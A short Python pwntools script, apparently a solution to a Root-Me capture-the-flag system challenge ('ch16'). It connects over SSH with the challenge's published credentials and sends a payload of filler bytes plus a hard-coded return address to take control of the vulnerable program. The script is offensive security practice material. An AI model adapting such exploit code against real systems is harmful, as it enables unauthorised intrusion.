from pwn import *

s = ssh(user='app-systeme-ch16', host='challenge02.root-me.org', port=2222, password='app-systeme-ch16')
r = s.process("./ch16")

dummy = "\x08"*4
addr = p32(0xbffffabc)
payload = bytes(dummy,'ascii') + addr
r.sendline(payload)

r.interactive()
